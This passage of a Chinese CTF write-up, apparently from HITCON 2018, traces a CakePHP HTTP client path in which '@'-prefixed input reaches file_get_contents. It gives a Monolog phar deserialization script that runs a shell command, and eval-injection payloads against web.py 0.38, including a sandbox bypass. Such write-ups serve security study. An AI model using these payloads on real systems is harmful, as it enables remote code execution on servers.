+<p>跟进Client里边的方法:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">public function post($url, $data = [], array $options = [])</span><br><span class="line">&#123;</span><br><span class="line">    $options = $this-&gt;_mergeOptions($options);</span><br><span class="line">    $url = $this-&gt;buildUrl($url, [], $options);</span><br><span class="line">    return $this-&gt;_doRequest(Request::METHOD_POST, $url, $data, $options);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>跟进_doRequest方法:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">protected function _doRequest($method, $url, $data, $options)</span><br><span class="line">&#123;</span><br><span class="line">    $request = $this-&gt;_createRequest(</span><br><span class="line">        $method,</span><br><span class="line">        $url,</span><br><span class="line">        $data,</span><br><span class="line">        $options</span><br><span class="line">    );</span><br><span class="line">    return $this-&gt;send($request, $options);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>_createRequest:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">protected function _createRequest($method, $url, $data, $options)</span><br><span class="line">    &#123;</span><br><span class="line">        $headers = isset($options[&apos;headers&apos;]) ? (array)$options[&apos;headers&apos;] : [];</span><br><span class="line">        if (isset($options[&apos;type&apos;])) &#123;</span><br><span class="line">            $headers = array_merge($headers, $this-&gt;_typeHeaders($options[&apos;type&apos;]));</span><br><span class="line">        &#125;</span><br><span class="line">        if (is_string($data) &amp;&amp; !isset($headers[&apos;Content-Type&apos;]) &amp;&amp; !isset($headers[&apos;content-type&apos;])) &#123;</span><br><span class="line">            $headers[&apos;Content-Type&apos;] = &apos;application/x-www-form-urlencoded&apos;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"> /*重点*/$request = new Request($url, $method, $headers, $data);</span><br><span class="line">        $cookies = isset($options[&apos;cookies&apos;]) ? $options[&apos;cookies&apos;] : [];</span><br><span class="line">        /** @var \Cake\Http\Client\Request $request */</span><br><span class="line">        $request = $this-&gt;_cookies-&gt;addToRequest($request, $cookies);</span><br><span class="line">        if (isset($options[&apos;auth&apos;])) &#123;</span><br><span class="line">            $request = $this-&gt;_addAuthentication($request, $options);</span><br><span class="line">        &#125;</span><br><span class="line">        if (isset($options[&apos;proxy&apos;])) &#123;</span><br><span class="line">            $request = $this-&gt;_addProxy($request, $options);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return $request;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>跟进Request类:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">public function __construct($url = &apos;&apos;, $method = self::METHOD_GET, array $headers = [], $data = null)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;validateMethod($method);</span><br><span class="line">        $this-&gt;method = $method;</span><br><span class="line">        $this-&gt;uri = $this-&gt;createUri($url);</span><br><span class="line">        $headers += [</span><br><span class="line">            &apos;Connection&apos; =&gt; &apos;close&apos;,</span><br><span class="line">            &apos;User-Agent&apos; =&gt; &apos;CakePHP&apos;</span><br><span class="line">        ];</span><br><span class="line">        $this-&gt;addHeaders($headers);</span><br><span class="line">        $this-&gt;body($data);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>跟进body方法:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">public function body($body = null)</span><br><span class="line">    &#123;</span><br><span class="line">        if ($body === null) &#123;</span><br><span class="line">            $body = $this-&gt;getBody();</span><br><span class="line"></span><br><span class="line">            return $body ? $body-&gt;__toString() : &apos;&apos;;</span><br><span class="line">        &#125;</span><br><span class="line">        if (is_array($body)) &#123;</span><br><span class="line">            $formData = new FormData();</span><br><span class="line">            $formData-&gt;addMany($body);</span><br><span class="line">            $this-&gt;header(&apos;Content-Type&apos;, $formData-&gt;contentType());</span><br><span class="line">            $body = (string)$formData;</span><br><span class="line">        &#125;</span><br><span class="line">        $stream = new Stream(&apos;php://memory&apos;, &apos;rw&apos;);</span><br><span class="line">        $stream-&gt;write($body);</span><br><span class="line">        $this-&gt;stream = $stream;</span><br><span class="line"></span><br><span class="line">        return $this;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>如果<code>$body</code>是数组的话，</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$formData-&gt;addMany($body);</span><br></pre></td></tr></table></figure>
+<p>跟进addMany方法:</p>
+<p>data来源: <code>data = $request-&gt;getQuery(&#39;data&#39;);</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">public function addMany(array $data)</span><br><span class="line">    &#123;</span><br><span class="line">        foreach ($data as $name =&gt; $value) &#123;</span><br><span class="line">            $this-&gt;add($name, $value);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return $this;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>跟进add方法:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">public function add($name, $value = null)</span><br><span class="line">    &#123;</span><br><span class="line">        if (is_array($value)) &#123;</span><br><span class="line">            $this-&gt;addRecursive($name, $value);</span><br><span class="line">        &#125; elseif (is_resource($value)) &#123;</span><br><span class="line">            $this-&gt;addFile($name, $value);</span><br><span class="line">        &#125; elseif (is_string($value) &amp;&amp; strlen($value) &amp;&amp; $value[0] === &apos;@&apos;) &#123;</span><br><span class="line">            trigger_error(</span><br><span class="line">                &apos;Using the @ syntax for file uploads is not safe and is deprecated. &apos; .</span><br><span class="line">                &apos;Instead you should use file handles.&apos;,</span><br><span class="line">                E_USER_DEPRECATED</span><br><span class="line">            );</span><br><span class="line">            $this-&gt;addFile($name, $value);</span><br><span class="line">        &#125; elseif ($name instanceof FormDataPart &amp;&amp; $value === null) &#123;</span><br><span class="line">            $this-&gt;_hasComplexPart = true;</span><br><span class="line">            $this-&gt;_parts[] = $name;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $this-&gt;_parts[] = $this-&gt;newPart($name, $value);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return $this;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>在该方法中，我们可以看到如果字符串以<code>@</code>符号开头的话，那么就会调用<code>addfile</code>方法。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">public function addFile($name, $value)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;_hasFile = true;</span><br><span class="line"></span><br><span class="line">        $filename = false;</span><br><span class="line">        $contentType = &apos;application/octet-stream&apos;;</span><br><span class="line">        if (is_resource($value)) &#123;</span><br><span class="line">            $content = stream_get_contents($value);</span><br><span class="line">            if (stream_is_local($value)) &#123;</span><br><span class="line">                $finfo = new finfo(FILEINFO_MIME);</span><br><span class="line">                $metadata = stream_get_meta_data($value);</span><br><span class="line">                $contentType = $finfo-&gt;file($metadata[&apos;uri&apos;]);</span><br><span class="line">                $filename = basename($metadata[&apos;uri&apos;]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $finfo = new finfo(FILEINFO_MIME);</span><br><span class="line">            $value = substr($value, 1);</span><br><span class="line">            $filename = basename($value);</span><br><span class="line">            $content = file_get_contents($value);</span><br><span class="line">            $contentType = $finfo-&gt;file($value);</span><br><span class="line">        &#125;</span><br><span class="line">        $part = $this-&gt;newPart($name, $content);</span><br><span class="line">        $part-&gt;type($contentType);</span><br><span class="line">        if ($filename) &#123;</span><br><span class="line">            $part-&gt;filename($filename);</span><br><span class="line">        &#125;</span><br><span class="line">        $this-&gt;add($part);</span><br><span class="line"></span><br><span class="line">        return $part;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>最终，在<code>addfile</code>方法中会调用<code>$content = file_get_contents($value);</code>方法。<code>$value</code>可控。</p>
+<p>构造payload:</p>
+<p><img src="/assets/hitcon/TIM截图20181025182341.png" alt=""></p>
+<h3 id="rce"><a href="#rce" class="headerlink" title="rce"></a>rce</h3><p>构造phar文件，通过get请求缓存，保存到 body.cache 中，在通过POST请求 body.cache，通过file_get_contents触发发序列化monolog类，最终rce。</p>
+<p>生成phar文件payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">namespace MonologHandler</span><br><span class="line">&#123;</span><br><span class="line">    class SyslogUdpHandler</span><br><span class="line">    &#123;</span><br><span class="line">        protected $socket;</span><br><span class="line">        function __construct($x)</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;socket = $x;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    class BufferHandler</span><br><span class="line">    &#123;</span><br><span class="line">        protected $handler;</span><br><span class="line">        protected $bufferSize = -1;</span><br><span class="line">        protected $buffer;</span><br><span class="line">        # ($record[&apos;level&apos;] &lt; $this-&gt;level) == false</span><br><span class="line">        protected $level = null;</span><br><span class="line">        protected $initialized = true;</span><br><span class="line">        # ($this-&gt;bufferLimit &gt; 0 &amp;&amp; $this-&gt;bufferSize === $this-&gt;bufferLimit) == false</span><br><span class="line">        protected $bufferLimit = -1;</span><br><span class="line">        protected $processors;</span><br><span class="line">        function __construct($methods, $command)</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;processors = $methods;</span><br><span class="line">            $this-&gt;buffer = [$command];</span><br><span class="line">            $this-&gt;handler = clone $this;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace&#123;</span><br><span class="line">    $cmd = &quot;ls -alt&quot;;</span><br><span class="line"></span><br><span class="line">    $obj = new MonologHandlerSyslogUdpHandler(</span><br><span class="line">        new MonologHandlerBufferHandler(</span><br><span class="line">            [&apos;current&apos;, &apos;system&apos;],</span><br><span class="line">            [$cmd, &apos;level&apos; =&gt; null]</span><br><span class="line">        )</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    $phar = new Phar(&apos;exploit.phar&apos;);</span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;addFromString(&apos;test&apos;, &apos;test&apos;);</span><br><span class="line">    $phar-&gt;setStub(&apos;&lt;?php __HALT_COMPILER(); ? &gt;&apos;);</span><br><span class="line">    $phar-&gt;setMetadata($obj);</span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="On-my-Raddit-V2"><a href="#On-my-Raddit-V2" class="headerlink" title="On my Raddit V2"></a>On my Raddit V2</h2><p>V1是个Crypto，兴趣不大。直接复现V2.</p>
+<p>参考链接: <a href="https://securityetalii.es/2014/11/08/remote-code-execution-in-web-py-framework/" rel="external nofollow" target="_blank">https://securityetalii.es/2014/11/08/remote-code-execution-in-web-py-framework/</a></p>
+<p>该网站使用web.py框架，根据requirements.txt可以知道版本号是0.38</p>
+<p>web.py:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"># coding: UTF-8</span><br><span class="line">import os</span><br><span class="line">import web</span><br><span class="line">import urllib</span><br><span class="line">import urlparse</span><br><span class="line">from Crypto.Cipher import DES</span><br><span class="line"></span><br><span class="line">web.config.debug = False</span><br><span class="line">ENCRPYTION_KEY = &apos;megnnaro&apos;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">urls = (</span><br><span class="line">    &apos;/&apos;, &apos;index&apos;</span><br><span class="line">)</span><br><span class="line">app = web.application(urls, globals())</span><br><span class="line">db = web.database(dbn=&apos;sqlite&apos;, db=&apos;db.db&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def encrypt(s):</span><br><span class="line">    length = DES.block_size - (len(s) % DES.block_size)</span><br><span class="line">    s = s + chr(length)*length</span><br><span class="line"></span><br><span class="line">    cipher = DES.new(ENCRPYTION_KEY, DES.MODE_ECB)</span><br><span class="line">    return cipher.encrypt(s).encode(&apos;hex&apos;)</span><br><span class="line"></span><br><span class="line">def decrypt(s):</span><br><span class="line">    try:</span><br><span class="line">        data = s.decode(&apos;hex&apos;)</span><br><span class="line">        cipher = DES.new(ENCRPYTION_KEY, DES.MODE_ECB)</span><br><span class="line"></span><br><span class="line">        data = cipher.decrypt(data)</span><br><span class="line">        data = data[:-ord(data[-1])]</span><br><span class="line">        return dict(urlparse.parse_qsl(data))</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print e.message</span><br><span class="line">        return &#123;&#125;</span><br><span class="line"></span><br><span class="line">def get_posts(limit=None):</span><br><span class="line">    records = []</span><br><span class="line">    for i in db.select(&apos;posts&apos;, limit=limit, order=&apos;ups desc&apos;):</span><br><span class="line">        tmp = &#123;</span><br><span class="line">            &apos;m&apos;: &apos;r&apos;, </span><br><span class="line">            &apos;t&apos;: i.title.encode(&apos;utf-8&apos;, &apos;ignore&apos;), </span><br><span class="line">            &apos;u&apos;: i.id, </span><br><span class="line">        &#125; </span><br><span class="line">        tmp[&apos;param&apos;] = encrypt(urllib.urlencode(tmp))</span><br><span class="line">        tmp[&apos;ups&apos;] = i.ups</span><br><span class="line">        if i.file:</span><br><span class="line">            tmp[&apos;file&apos;] = encrypt(urllib.urlencode(&#123;&apos;m&apos;: &apos;d&apos;, &apos;f&apos;: i.file&#125;))</span><br><span class="line">        else:</span><br><span class="line">            tmp[&apos;file&apos;] = &apos;&apos;</span><br><span class="line"></span><br><span class="line">        records.append( tmp )</span><br><span class="line">    return records</span><br><span class="line"></span><br><span class="line">def get_urls():</span><br><span class="line">    urls = []</span><br><span class="line">    for i in [10, 100, 1000]:</span><br><span class="line">        data = &#123;</span><br><span class="line">            &apos;m&apos;: &apos;p&apos;, </span><br><span class="line">            &apos;l&apos;: i</span><br><span class="line">        &#125;</span><br><span class="line">        urls.append( encrypt(urllib.urlencode(data)) )</span><br><span class="line">    return urls</span><br><span class="line"></span><br><span class="line">class index:</span><br><span class="line">    def GET(self):</span><br><span class="line">        s = web.input().get(&apos;s&apos;)</span><br><span class="line">        if not s:</span><br><span class="line">            return web.template.frender(&apos;templates/index.html&apos;)(get_posts(), get_urls())</span><br><span class="line">        else:</span><br><span class="line">            s = decrypt(s)</span><br><span class="line">            method = s.get(&apos;m&apos;, &apos;&apos;)</span><br><span class="line">            if method and method not in list(&apos;rdp&apos;):</span><br><span class="line">                return &apos;param error&apos;</span><br><span class="line">            if method == &apos;r&apos;:</span><br><span class="line">                uid = s.get(&apos;u&apos;)</span><br><span class="line">                record = db.select(&apos;posts&apos;, where=&apos;id=$id&apos;, vars=&#123;&apos;id&apos;: uid&#125;).first()</span><br><span class="line">                if record:</span><br><span class="line">                    raise web.seeother(record.url)</span><br><span class="line">                else:</span><br><span class="line">                    return &apos;not found&apos;</span><br><span class="line">            elif method == &apos;d&apos;:</span><br><span class="line">                file = s.get(&apos;f&apos;)</span><br><span class="line">                if not os.path.exists(file):</span><br><span class="line">                    return &apos;not found&apos;</span><br><span class="line">                name = os.path.basename(file)</span><br><span class="line">                web.header(&apos;Content-Disposition&apos;, &apos;attachment; filename=%s&apos; % name)</span><br><span class="line">                web.header(&apos;Content-Type&apos;, &apos;application/pdf&apos;)</span><br><span class="line">                with open(file, &apos;rb&apos;) as fp:</span><br><span class="line">                    data = fp.read()</span><br><span class="line">                return data</span><br><span class="line">            elif method == &apos;p&apos;:</span><br><span class="line">                limit = s.get(&apos;l&apos;)</span><br><span class="line">                return web.template.frender(&apos;templates/index.html&apos;)(get_posts(limit), get_urls())</span><br><span class="line">            else:</span><br><span class="line">                return web.template.frender(&apos;templates/index.html&apos;)(get_posts(), get_urls())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>
+<p>问题出在Web.py的db部分，可能让用户注入代码。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">def reparam(string_, dictionary):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    Takes a string and a dictionary and interpolates the string</span><br><span class="line">    using values from the dictionary. Returns an `SQLQuery` for the result.</span><br><span class="line"></span><br><span class="line">        &gt;&gt;&gt; reparam(&quot;s = $s&quot;, dict(s=True))</span><br><span class="line">        &lt;sql: &quot;s = &apos;t&apos;&quot;&gt;</span><br><span class="line">        &gt;&gt;&gt; reparam(&quot;s IN $s&quot;, dict(s=[1, 2]))</span><br><span class="line">        &lt;sql: &apos;s IN (1, 2)&apos;&gt;</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    dictionary = dictionary.copy() # eval mucks with it</span><br><span class="line">    vals = []</span><br><span class="line">    result = []</span><br><span class="line">    for live, chunk in _interpolate(string_):</span><br><span class="line">        if live:</span><br><span class="line">            v = eval(chunk, dictionary)</span><br><span class="line">            result.append(sqlquote(v))</span><br><span class="line">        else:</span><br><span class="line">            result.append(chunk)</span><br><span class="line">    return SQLQuery.join(result, &apos;&apos;)</span><br></pre></td></tr></table></figure>
+<p>在web.py中get_posts方法中，db.select 会调用上边的方法。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">def get_posts(limit=None):</span><br><span class="line">    records = []</span><br><span class="line">    for i in db.select(&apos;posts&apos;, limit=limit, order=&apos;ups desc&apos;):</span><br><span class="line">        tmp = &#123;</span><br><span class="line">            &apos;m&apos;: &apos;r&apos;, </span><br><span class="line">            &apos;t&apos;: i.title.encode(&apos;utf-8&apos;, &apos;ignore&apos;), </span><br><span class="line">            &apos;u&apos;: i.id, </span><br><span class="line">        &#125; </span><br><span class="line">        tmp[&apos;param&apos;] = encrypt(urllib.urlencode(tmp))</span><br><span class="line">        tmp[&apos;ups&apos;] = i.ups</span><br><span class="line">        if i.file:</span><br><span class="line">            tmp[&apos;file&apos;] = encrypt(urllib.urlencode(&#123;&apos;m&apos;: &apos;d&apos;, &apos;f&apos;: i.file&#125;))</span><br><span class="line">        else:</span><br><span class="line">            tmp[&apos;file&apos;] = &apos;&apos;</span><br><span class="line"></span><br><span class="line">        records.append( tmp )</span><br><span class="line">    return records</span><br></pre></td></tr></table></figure>
+<p>limit可控，构造payload如下:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&apos;m&apos;:&apos;p&apos;,&apos;l&apos;:&apos;$__import__(&quot;os&quot;).system(&quot;ls &gt; /tmp/ls.txt&quot;)&apos;&#125;</span><br></pre></td></tr></table></figure>
+<p>该payload已被修复，但是依然可以绕过:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&apos;m&apos;:&apos;p&apos;,&apos;l&apos;:&apos;$&#123;(lambda getthem=([x for x in ().__class__.__base__.__subclasses__() if x.__name__==&quot;catch_warnings&quot;][0]()._module.__builtins__):getthem[&quot;__import__&quot;](&quot;os&quot;).system(&quot;ls -al / &gt; /tmp/1.txt&quot;))()&#125;&apos;&#125;</span><br></pre></td></tr></table></figure>
+<p>然后，下载 1.txt 即可。</p>
+
+    </article>
+    <!-- license  -->
+    
+        <div class="license-wrapper">
+            <p>原文作者: <a href="https://www.tiandiwuji.top">Tianji</a>
+            </p><p>原文链接: <a href="https://www.tiandiwuji.top/posts/49989/">https://www.tiandiwuji.top/posts/49989/</a>
+            </p><p>发表日期: <a href="https://www.tiandiwuji.top/posts/49989/">October 23rd 2018, 7:08:03 pm</a>
+            </p><p>版权声明: 本文采用<a rel="external nofollow" href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href="/posts/30021/" title="hack-lu">
+                    <div class="prevTitle">hack-lu</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+    <div id="lv-container" data-id="city" data-uid="MTAyMC8zODcyNS8xNTI1Mw==">
+        <script type="text/javascript">
+            (function (d, s) {
+                var j, e = d.getElementsByTagName(s)[0];
+                if (typeof LivereTower === 'function') { return; }
+                j = d.createElement(s);
+                j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+                j.async = true;
+
+                e.parentNode.insertBefore(j, e);
+            })(document, 'script');
+        </script>
+        <noscript>为正常使用来必力评论功能请激活JavaScript</noscript>
+    </div>
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!--PC和WAP自适应版-->
+
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:fengyunhetao@gmail.com" class="iconfont-archer email" title="email" rel="external nofollow" target="_blank"></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/fengyuhetao" class="iconfont-archer github" target="_blank" title="github"></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank" rel="external nofollow">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank" rel="external nofollow">Archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+    
+     
+    <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+    
+    </div>
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style="top:50vh;">
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
